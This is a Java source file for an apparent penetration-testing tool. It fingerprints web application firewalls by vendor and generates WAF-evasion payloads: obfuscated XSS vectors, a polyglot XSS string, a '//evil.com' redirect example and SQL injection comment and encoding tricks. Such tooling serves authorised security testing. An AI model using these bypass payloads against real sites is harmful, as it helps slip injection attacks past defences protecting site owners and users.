package com.vista.security.core;

import java.util.*;
import java.util.regex.Pattern;

/**
 * WAF Detection Engine - Identifies Web Application Firewalls and security controls.
 * Based on response headers, error messages, and behavior patterns.
 */
public class WAFDetector {

    public static class WAFInfo {
        public final String name;
        public final String version;
        public final double confidence; // 0.0 to 1.0
        public final List<String> evidence;
        public final List<String> bypassTechniques;

        public WAFInfo(String name, String version, double confidence, List<String> evidence, List<String> bypassTechniques) {
            this.name = name;
            this.version = version;
            this.confidence = confidence;
            this.evidence = evidence;
            this.bypassTechniques = bypassTechniques;
        }
    }

    private static final Map<String, WAFSignature> WAF_SIGNATURES = new HashMap<>();

    static {
        // Cloudflare
        WAF_SIGNATURES.put("Cloudflare", new WAFSignature(
            "Cloudflare",
            Arrays.asList("cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"),
            Arrays.asList("cloudflare", "cf-ray", "attention required"),
            Arrays.asList(
                "Case variation: <ScRiPt>alert(1)</sCriPt>",
                "Unicode normalization: <script>alert(1)</script> ‚Üí ÔºúscriptÔºûalert‚ÅΩ1‚ÅæÔºú/scriptÔºû",
                "HTML entities: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
                "Polyglot payloads with mixed encoding",
                "SVG with event handlers: <svg/onload=alert(1)>",
                "Use allowed protocols: javascript:alert(1)",
                "DOM-based XSS to bypass server-side filtering"
            )
        ));

        // AWS WAF
        WAF_SIGNATURES.put("AWS WAF", new WAFSignature(
            "AWS WAF",
            Arrays.asList("x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id"),
            Arrays.asList("aws", "forbidden", "request blocked"),
            Arrays.asList(
                "Parameter pollution: ?id=1&id=<script>alert(1)</script>",
                "Chunked encoding bypass",
                "Case variation in SQL keywords: SeLeCt",
                "Comment-based obfuscation: /*!50000SELECT*/",
                "Whitespace variations: SELECT/**/FROM"
            )
        ));

        // ModSecurity
        WAF_SIGNATURES.put("ModSecurity", new WAFSignature(
            "ModSecurity",
            Arrays.asList("mod_security", "NOYB"),
            Arrays.asList("mod_security", "not acceptable", "406 not acceptable"),
            Arrays.asList(
                "Null byte injection: %00",
                "Newline injection: %0a, %0d",
                "Case variation: <ScRiPt>",
                "Alternative syntax: <svg/onload=alert(1)>",
                "Encoding bypass: %3Cscript%3E",
                "Comment injection: /*!50000SELECT*/"
            )
        ));

        // Akamai
        WAF_SIGNATURES.put("Akamai", new WAFSignature(
            "Akamai",
            Arrays.asList("akamai", "akamai-x-cache", "akamai-grn"),
            Arrays.asList("akamai", "reference #", "access denied"),
            Arrays.asList(
                "Protocol-relative URLs: //evil.com",
                "Data URI scheme: data:text/html,<script>alert(1)</script>",
                "Mixed case: <ScRiPt>",
                "Alternative tags: <svg>, <img>, <iframe>",
                "Event handler obfuscation: on\\x00load"
            )
        ));

        // Imperva (Incapsula)
        WAF_SIGNATURES.put("Imperva", new WAFSignature(
            "Imperva",
            Arrays.asList("x-cdn", "incap_ses", "visid_incap"),
            Arrays.asList("incapsula", "imperva", "request unsuccessful"),
            Arrays.asList(
                "HPP (HTTP Parameter Pollution)",
                "Chunked transfer encoding",
                "Multipart form-data bypass",
                "Case variation in SQL: SeLeCt",
                "Alternative XSS vectors: <marquee onstart=alert(1)>"
            )
        ));

        // Wordfence
        WAF_SIGNATURES.put("Wordfence", new WAFSignature(
            "Wordfence",
            Arrays.asList("wordfence"),
            Arrays.asList("wordfence", "generated by wordfence"),
            Arrays.asList(
                "WordPress-specific bypasses",
                "REST API exploitation",
                "Plugin-specific vulnerabilities",
                "Theme file inclusion"
            )
        ));

        // Sucuri
        WAF_SIGNATURES.put("Sucuri", new WAFSignature(
            "Sucuri",
            Arrays.asList("x-sucuri-id", "x-sucuri-cache"),
            Arrays.asList("sucuri", "access denied", "blocked by sucuri"),
            Arrays.asList(
                "Case variation",
                "Encoding bypass: URL, HTML, Unicode",
                "Alternative XSS vectors",
                "SQL comment injection"
            )
        ));

        // F5 BIG-IP
        WAF_SIGNATURES.put("F5 BIG-IP", new WAFSignature(
            "F5 BIG-IP",
            Arrays.asList("bigipserver", "f5-trace-id", "x-wa-info"),
            Arrays.asList("f5", "bigip", "the requested url was rejected"),
            Arrays.asList(
                "HPP bypass",
                "Chunked encoding",
                "Case variation",
                "Alternative syntax"
            )
        ));
    }

    /**
     * Detect WAF from HTTP response.
     */
    public static List<WAFInfo> detectWAF(String responseHeaders, String responseBody, int statusCode) {
        List<WAFInfo> detected = new ArrayList<>();
        String combined = (responseHeaders + "\n" + responseBody).toLowerCase();

        for (Map.Entry<String, WAFSignature> entry : WAF_SIGNATURES.entrySet()) {
            WAFSignature sig = entry.getValue();
            List<String> evidence = new ArrayList<>();
            int matches = 0;

            // Check headers
            for (String header : sig.headers) {
                if (combined.contains(header.toLowerCase())) {
                    evidence.add("Header: " + header);
                    matches++;
                }
            }

            // Check body patterns
            for (String pattern : sig.bodyPatterns) {
                if (combined.contains(pattern.toLowerCase())) {
                    evidence.add("Pattern: " + pattern);
                    matches++;
                }
            }

            // Check for common WAF status codes
            if (statusCode == 403 || statusCode == 406 || statusCode == 419 || statusCode == 429) {
                evidence.add("Status code: " + statusCode);
                matches++;
            }

            if (matches > 0) {
                double confidence = Math.min(1.0, matches / 3.0);
                detected.add(new WAFInfo(
                    sig.name,
                    "unknown",
                    confidence,
                    evidence,
                    sig.bypassTechniques
                ));
            }
        }

        // Sort by confidence
        detected.sort((a, b) -> Double.compare(b.confidence, a.confidence));
        return detected;
    }

    /**
     * Get bypass suggestions for detected WAF.
     */
    public static String getBypassSuggestions(List<WAFInfo> wafList) {
        if (wafList.isEmpty()) {
            return "No WAF detected. Using standard payloads.";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("üõ°Ô∏è WAF DETECTED:\n\n");

        for (WAFInfo waf : wafList) {
            sb.append("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n");
            sb.append("WAF: ").append(waf.name).append("\n");
            sb.append("Confidence: ").append(String.format("%.0f%%", waf.confidence * 100)).append("\n");
            sb.append("Evidence:\n");
            for (String ev : waf.evidence) {
                sb.append("  ‚Ä¢ ").append(ev).append("\n");
            }
            sb.append("\nüîì BYPASS TECHNIQUES:\n");
            for (int i = 0; i < waf.bypassTechniques.size(); i++) {
                sb.append((i + 1)).append(". ").append(waf.bypassTechniques.get(i)).append("\n");
            }
            sb.append("\n");
        }

        return sb.toString();
    }

    /**
     * Generate WAF-specific bypass payloads.
     */
    public static List<String> generateBypassPayloads(String basePayload, List<WAFInfo> wafList) {
        List<String> bypasses = new ArrayList<>();
        
        if (wafList.isEmpty()) {
            return Arrays.asList(basePayload);
        }

        String wafName = wafList.get(0).name;

        // XSS bypasses
        if (basePayload.toLowerCase().contains("script") || basePayload.toLowerCase().contains("alert")) {
            bypasses.addAll(generateXSSBypasses(basePayload, wafName));
        }
        
        // SQLi bypasses
        if (basePayload.toLowerCase().contains("select") || basePayload.toLowerCase().contains("union") ||
            basePayload.contains("'") || basePayload.contains("\"")) {
            bypasses.addAll(generateSQLiBypasses(basePayload, wafName));
        }

        return bypasses.isEmpty() ? Arrays.asList(basePayload) : bypasses;
    }

    private static List<String> generateXSSBypasses(String payload, String waf) {
        List<String> bypasses = new ArrayList<>();
        
        // Case variation
        bypasses.add(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</sCriPt>"));
        
        // Alternative tags
        bypasses.add("<svg/onload=alert(1)>");
        bypasses.add("<img src=x onerror=alert(1)>");
        bypasses.add("<body onload=alert(1)>");
        bypasses.add("<marquee onstart=alert(1)>");
        
        // Encoding
        bypasses.add("%3Cscript%3Ealert(1)%3C/script%3E");
        bypasses.add("&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;");
        
        // Polyglot
        bypasses.add("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>");
        
        // WAF-specific
        if ("Cloudflare".equals(waf)) {
            bypasses.add("<svg/onload=alert(1)//>");
            bypasses.add("<script>alert(String.fromCharCode(88,83,83))</script>");
        }
        
        return bypasses;
    }

    private static List<String> generateSQLiBypasses(String payload, String waf) {
        List<String> bypasses = new ArrayList<>();
        
        // Case variation
        bypasses.add(payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"));
        
        // Comment injection
        bypasses.add(payload.replace(" ", "/**/"));
        bypasses.add("/*!50000" + payload + "*/");
        
        // Encoding
        bypasses.add(payload.replace(" ", "%20").replace("'", "%27"));
        
        // Alternative syntax
        bypasses.add(payload.replace("=", " LIKE "));
        bypasses.add(payload.replace("OR", "||"));
        bypasses.add(payload.replace("AND", "&&"));
        
        return bypasses;
    }

    private static class WAFSignature {
        final String name;
        final List<String> headers;
        final List<String> bodyPatterns;
        final List<String> bypassTechniques;

        WAFSignature(String name, List<String> headers, List<String> bodyPatterns, List<String> bypassTechniques) {
            this.name = name;
            this.headers = headers;
            this.bodyPatterns = bodyPatterns;
            this.bypassTechniques = bypassTechniques;
        }
    }
}
